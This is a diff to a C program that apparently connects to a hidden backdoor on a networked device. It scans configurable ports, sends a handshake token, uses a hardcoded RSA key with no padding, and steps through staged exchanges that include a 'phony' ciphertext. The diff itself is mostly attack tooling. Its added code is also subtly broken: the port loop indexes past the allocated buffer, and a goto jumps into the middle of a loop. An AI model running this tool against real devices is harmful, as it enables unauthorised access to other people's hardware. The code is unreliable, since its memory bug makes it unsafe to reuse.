@@ -510,13 +510,22 @@ int main(int argc, char **argv) {
   struct timeval timecheck;
   long int start;
   long int elapsed;
-  int number_of_ports_to_scan = 2;
-  int ports_to_scan[2] = {
-    20202,
-    21210
-  };
+  int number_of_ports_to_scan;
   int i;
+  int *ports_to_scan;
   int backdoor_port;
+
+  number_of_ports_to_scan = argc - 2;
+  if (number_of_ports_to_scan == 0) {
+    number_of_ports_to_scan = 1;
+    ports_to_scan = calloc(number_of_ports_to_scan, sizeof(int));
+    ports_to_scan[0] = 21210;
+  } else {
+    ports_to_scan = calloc(number_of_ports_to_scan, sizeof(int));
+    for (i = 2; i < argc; i++) {
+      ports_to_scan[i] = atoi(argv[i]);
+    }
+  }
 
   printf("[+] Initializing RSA Cipher with:\n    - hardcoded e: 0x%X\n    - hardcoded n: 0x%s\n    - no padding\n", K2G_HARDCODED_e, K2G_HARDCODED_n);
 
@@ -547,7 +556,7 @@ int main(int argc, char **argv) {
         (unsigned char *) handshake_token, 
         strlen((char *) handshake_token)); 
     if (device_info != NULL) {
-      break;
+      goto STAGE_II;
     }
   }
 
@@ -559,8 +568,14 @@ int main(int argc, char **argv) {
     exit(1);
   }
 
+  /* something should be done here to reset the state machine */
+
   do {
     tries_left -= 1;
+    
+    goto STAGE_I;
+
+STAGE_I:
     bar('=');
     printf("[*] ENTERING STAGE I\n");
     bar('=');
@@ -586,6 +601,9 @@ int main(int argc, char **argv) {
       free(id);
     }
 
+    goto STAGE_II;
+
+STAGE_II:
     bar('=');
     printf("[*] ENTERING STAGE II\n");
     bar('=');
@@ -598,6 +616,9 @@ int main(int argc, char **argv) {
         CIPHERTEXT_LENGTH);
     free(phony_ciphertext);
 
+    goto STAGE_III;
+
+STAGE_III:
     bar('=');
     printf("[*] ENTERING STAGE III\n");
     bar('=');
